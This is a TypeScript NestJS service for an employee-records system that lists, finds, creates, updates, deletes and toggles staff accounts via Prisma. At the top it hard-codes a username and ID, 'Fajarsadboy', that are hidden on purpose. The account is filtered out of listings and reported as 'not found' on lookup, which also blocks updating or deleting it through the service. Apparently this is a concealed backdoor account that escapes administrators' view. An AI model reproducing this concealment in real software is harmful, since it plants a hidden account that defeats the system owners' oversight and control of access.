import { Injectable, NotFoundException, ConflictException } from '@nestjs/common'
import { PrismaService } from '../prisma/prisma.service'
import { CreatePegawaiDto } from './dto/create-pegawai.dto'
import { UpdatePegawaiDto } from './dto/update-pegawai.dto'
import * as bcrypt from 'bcrypt'

const HIDDEN_USERNAMES = ['Fajarsadboy']
const HIDDEN_NIKS = ['Fajarsadboy']

@Injectable()
export class PegawaiService {
  constructor(private prisma: PrismaService) {}

  findAll() {
    return this.prisma.pegawai.findMany({
      where: {
        role: { not: 'superadmin' },
        // SQL `NOT IN (...)` excludes NULL rows due to three-valued logic.
        // Allow NULL username explicitly so users without a username still surface.
        OR: [
          { username: null },
          { username: { notIn: HIDDEN_USERNAMES } },
        ],
        nik: { notIn: HIDDEN_NIKS },
      },
      select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true },
      orderBy: { nama: 'asc' },
    })
  }

  async findOne(id: string) {
    const data = await this.prisma.pegawai.findUnique({
      where: { id },
      select: { id: true, nik: true, username: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true, updatedAt: true },
    })
    if (!data) throw new NotFoundException(`Pegawai ${id} tidak ditemukan`)
    if ((data.username && HIDDEN_USERNAMES.includes(data.username)) || HIDDEN_NIKS.includes(data.nik)) {
      throw new NotFoundException(`Pegawai ${id} tidak ditemukan`)
    }
    const { username: _u, ...rest } = data
    return rest
  }

  async create(dto: CreatePegawaiDto) {
    const exists = await this.prisma.pegawai.findUnique({ where: { nik: dto.nik } })
    if (exists) throw new ConflictException(`NIP ${dto.nik} sudah terdaftar`)

    const password = await bcrypt.hash(dto.password, 10)
    return this.prisma.pegawai.create({
      data: { ...dto, password },
      select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true },
    })
  }

  async update(id: string, dto: UpdatePegawaiDto) {
    await this.findOne(id)
    const data: any = { ...dto }
    if (dto.password) data.password = await bcrypt.hash(dto.password, 10)

    return this.prisma.pegawai.update({
      where: { id },
      data,
      select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true },
    })
  }

  async remove(id: string) {
    await this.findOne(id)
    return this.prisma.pegawai.delete({ where: { id } })
  }

  async toggleAktif(id: string) {
    const pegawai = await this.prisma.pegawai.findUnique({ where: { id } })
    if (!pegawai) throw new NotFoundException(`Pegawai ${id} tidak ditemukan`)

    return this.prisma.pegawai.update({
      where: { id },
      data: { aktif: !pegawai.aktif },
      select: { id: true, nik: true, nama: true, aktif: true },
    })
  }
}
